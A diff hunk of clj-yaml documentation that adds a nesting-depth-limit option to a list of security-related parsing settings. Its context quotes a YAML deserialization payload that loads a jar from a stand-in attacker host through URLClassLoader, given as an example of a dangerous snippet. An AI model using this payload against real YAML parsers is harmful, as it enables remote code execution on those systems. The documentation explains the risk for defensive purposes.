@@ -171,7 +171,7 @@ Here's the dangerous snippit described:
 some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]
 ----
 
-Also security related are `:allow-recursive-keys` and `:max-aliases-for-collections` options.
+Also security related are the `:allow-recursive-keys`, `:max-aliases-for-collections`, and `:nesting-depth-limit` options.
 
 ==== Positional Data [[mark]]
 You can ask clj-yaml to return parsed YAML with extra positional data markers via the `:mark true` option.
